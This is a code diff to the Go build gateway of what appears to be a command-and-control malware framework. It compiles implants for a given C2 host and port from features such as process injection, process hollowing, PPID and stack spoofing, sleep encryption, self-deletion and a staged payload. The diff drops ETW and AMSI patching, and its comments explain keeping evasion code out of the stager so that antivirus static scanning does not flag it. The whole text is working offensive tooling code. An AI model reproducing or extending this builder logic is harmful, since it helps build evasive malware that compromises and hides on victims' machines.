@@ -228,10 +228,10 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		allowed := map[string]bool{
 			"inject-classic": true, "inject-apc": true, "inject-hollow": true,
 			"inject-hijack": true, "inject-stomp": true, "unhook": true,
-			"etw-patch": true, "amsi-patch": true, "ppid-spoof": true,
-			"heap-encrypt": true, "stack-spoof": true, "udrl": true, "staged-payload": true,
-			"self-delete": true, "channel-tcp": true, "channel-smb": true,
-			"sleep-encrypt": true, "process-hollow": true, "pack-stager": true,
+			"ppid-spoof": true, "heap-encrypt": true, "stack-spoof": true,
+			"udrl": true, "staged-payload": true, "self-delete": true,
+			"channel-tcp": true, "channel-smb": true, "sleep-encrypt": true,
+			"process-hollow": true, "pack-stager": true,
 		}
 		var validated []string
 		for _, f := range features {
@@ -259,9 +259,8 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 	// The server serves the companion payload (no staged-payload feature) from that endpoint.
 	//
 	// The stager is compiled with a minimal feature set (only what it needs to stage).
-	// Evasion features like etw-patch/amsi-patch belong in the payload only — they run
-	// inside the hollowed process. Including them in the stager adds static signatures to
-	// a binary that BD scans before the hollow even happens.
+	// Heavier evasion features belong in the payload only — they run inside the hollowed
+	// process. Including them in the stager adds static signatures to the initial binary.
 	if strings.Contains(featuresArg, "staged-payload") {
 		payloadFeatures := removeFeature(featuresArg, "staged-payload")
 		payloadImageTag := "dm-payload-build-" + buildID
@@ -313,8 +312,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 	// directive, not a Cargo feature.
 	featuresArg = removeFeature(featuresArg, "pack-stager")
 
-	// For staged-payload builds use a minimal stager feature set so evasion code
-	// (etw-patch, amsi-patch, etc.) doesn't appear in the stager binary's .text.
+	// For staged-payload builds use a minimal stager feature set so the stager binary stays lean.
 	stagerFeatures := featuresArg
 	if strings.Contains(featuresArg, "staged-payload") {
 		stagerFeatures = buildStagerFeatures(featuresArg)
@@ -443,7 +441,7 @@ func nilIfEmpty(s string) *string {
 
 // buildStagerFeatures returns the subset of features the stager binary should be
 // compiled with. The stager only needs to download the payload and hollow/inject it;
-// evasion features (etw-patch, amsi-patch, sleep-encrypt, heap-encrypt, etc.) belong
+// evasion features (sleep-encrypt, heap-encrypt, etc.) belong
 // in the companion payload which runs inside the hollowed process.
 func buildStagerFeatures(allFeatures string) string {
 	stagerAllowed := map[string]bool{
